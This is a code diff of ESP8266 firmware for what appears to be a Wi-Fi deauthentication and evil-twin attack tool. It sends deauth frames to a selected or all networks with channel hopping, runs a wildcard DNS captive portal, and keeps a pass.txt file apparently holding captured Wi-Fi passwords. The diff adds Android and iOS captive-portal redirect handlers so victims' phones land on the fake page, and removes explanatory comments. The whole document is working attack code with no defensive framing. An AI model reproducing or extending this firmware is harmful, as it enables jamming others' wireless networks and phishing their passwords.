@@ -18,7 +18,7 @@ bool attack_all = false;
 String selected_bssid = ""; 
 String selected_ssid = "";
 uint8_t target_ch = 1;
-uint8_t admin_ch = 1; // KUNCI UTAMA DISINI
+uint8_t admin_ch = 1; 
 
 ESP8266WebServer server(80);
 DNSServer dnsServer;
@@ -151,15 +151,14 @@ String processor(const String& var) {
 void setup() {
   Serial.begin(115200); LittleFS.begin();
   
-  // STEP FIX: Bersihin radio dulu
   WiFi.disconnect();
   WiFi.softAPdisconnect(true);
   WiFi.mode(WIFI_AP_STA);
   
-  // PAKSA CHANNEL 1 BIAR STABIL
   WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str(), 1); 
   admin_ch = 1;
   
+  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
   dnsServer.start(53, "*", WiFi.softAPIP());
 
   server.on("/", []() {
@@ -170,8 +169,13 @@ void setup() {
     server.send(200, "text/html", html);
   });
 
+  // Handler Captive Portal buat Android & iOS
+  server.on("/generate_204", []() { server.sendHeader("Location", "/"); server.send(302); });
+  server.on("/redirect", []() { server.sendHeader("Location", "/"); server.send(302); });
+  server.on("/hotspot-detect.html", []() { server.sendHeader("Location", "/"); server.send(302); });
+
   server.on("/scan", []() { 
-    wifi_promiscuous_enable(0); // Matikan deauth pas lagi scan
+    wifi_promiscuous_enable(0);
     WiFi.scanNetworks(true, true); 
     server.sendHeader("Location", "/"); 
     server.send(302); 
@@ -201,7 +205,10 @@ void setup() {
 
   server.on("/clear", []() { LittleFS.remove("/pass.txt"); server.sendHeader("Location", "/"); server.send(302); });
   server.on("/reboot", []() { ESP.restart(); });
-  server.onNotFound([]() { server.sendHeader("Location", "/", true); server.send(302, "text/plain", ""); });
+  server.onNotFound([]() { 
+    server.sendHeader("Location", "/", true); 
+    server.send(302, "text/plain", ""); 
+  });
   server.begin();
 }
 
@@ -213,7 +220,7 @@ void loop() {
     wifi_set_channel(target_ch);
     sendDeauth(selected_bssid);
     yield();
-    wifi_set_channel(admin_ch); // Langsung balik ke channel admin biar HP gak putus
+    wifi_set_channel(admin_ch); 
   }
   
   if (rusuh_mode || attack_all) {
@@ -225,7 +232,7 @@ void loop() {
       ch++; if (ch > 13) ch = 1;
       last_hop = millis();
       yield();
-      wifi_set_channel(admin_ch); // Balik lagi ke admin
+      wifi_set_channel(admin_ch); 
     }
   }
   
